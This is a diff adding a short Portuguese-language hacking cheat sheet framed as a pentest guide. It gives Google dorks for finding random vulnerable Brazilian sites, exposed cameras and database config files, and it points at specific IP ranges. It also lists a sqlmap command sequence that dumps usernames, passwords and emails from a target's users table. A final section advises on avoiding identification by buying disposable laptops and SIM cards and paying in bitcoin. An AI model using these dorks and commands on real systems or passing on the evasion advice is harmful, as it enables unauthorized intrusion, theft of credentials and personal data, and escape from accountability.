@@ -1,0 +1,104 @@
+<!-- 
+--------------------------------------------------------
+         .--.       .--.
+    _  `    \     /    `  _
+     `\.===. \.^./ .===./`
+            \/`"`\/
+         ,  |     |  ,
+        / `\|;-.-'|/` \
+       /    |::\  |    \
+    .-' ,-'`|:::; |`'-, '-.
+        |   |::::\|   | 
+        |   |::::;|   |
+        |   \:::://   |
+        |    `.://'   |
+       .'             `.
+    _,'                 `,_
+bug's Modafoker? contato[at]kembolle[dot]com.br 
+--------------------------------------------------------
+:::::: Index.of  ::::::  
+0x01- Fases Pentest;   
+0x02- Encontrando alvos pela Internet; 
+0x03- Identificação de Serviços e Tecnologias ; 
+0x04- Principais brechas exploradas Dados Sensiveis e SQL;  
+0x05- Meios de Fraudes e Ocultação; 
+
+Observação: type control+F e procure tópico Ex: 0x03
+-->
+
+
+-------------------------------------------------------- 
+:::::: 0x01- Fases Pentest 
+1- Planejamento e Preparação
+2- Avaliação
+A- Obtenção de Informação
+B- Sondagem e Mapeamento
+C- Identificação de Vulnerabilidades
+D- Exploração
+3- Documentação e Relatório
+4- Conclusões
+5- Recomendações de leitura
+
+Metodologias: 
+OSSTMM – Open Source Security Testing Methodology Manual
+NIST Special Publication 800-42: Guidelines on Network Security Testing
+NIST Special Publication 800-115: Technical Guide to Information Security Testing and Assessment
+ISSAF – Information Systems Security Assessment Framework
+OWASP – Open Web Application Security Project
+
+
+-------------------------------------------------------- 
+:::::: 0x02- Encontrando alvos pela Internet; 
+
+Tecnica: google dork , customizando estas pesquisas você pode chegar a vários alvos de uma vez só. (: 
+
+Por URL: 
+ex 1: site:.com.br  // sites brasileiros. 
+ex 2: inurl noticias.php id= // onde inurl é procurar em URLs , noticias.php é a linguagem 
+de interpretação do website e id= é numero de registro em banco de dados. 
+
+Por Endereçamentos de IP: 
+ex 1: Endereços de IP por Municipios http://tools.tracemyip.org/search--city/cuiab%C3%A1-!-mato+grosso 
+Oh yes! <3³' 
+ex 2: Que tal: 187.52.106.0/24 ou 187.52.107.0/24 ou 189.59.42.0  ou 200.52.47.0 :P
+
+
+-------------------------------------------------------- 
+:::::: 0x03- Identificação de Serviços e Tecnologias;  
+
+Tecnica: Banner Grabbing 
+Ferramentas: Mantra Browser OWASP 
+
+
+-------------------------------------------------------- 
+:::::: 0x04- Principais brechas exploradas Dados Sensiveis e SQL;
+
+Exploração de dados Sensiveis: 
+Cameras: inurl:view/indexframe.shtml 
+Banco de dados: filetype:inc dbconn site:.com  // 
+
+
+SQL : Injeção de instrução maliciosa para indetificação e exploração de brechas. 
+
+sqlmap -u http://sitealvo.com.br --dbs 
+sqlmap -u http://sitealvo.com.br --dbs 
+sqlmap -u http://sitealvo.com.br --dbs  -D acuart --tables
+sqlmap -u http://sitealvo.com.br --dbs  -D acuart -T users --columns
+sqlmap -u http://sitealvo.com.br --dbs  -D acuart -T users -C name,pass,uname,email --dump
+
+
+-------------------------------------------------------- 
+:::::: 0x05- Meios de Fraudes e Ocultação;  
+
+1º vá ao paraguai e compre 30 notebooks. 
+2º compre 30 chip's de internet 
+3º registre 1 por semana e navegue sem proxye. (: 
+4º compre bitcoins e jogue notebook fora!
+e assim vive o underground.... 
+
+
+
+
+
+
+
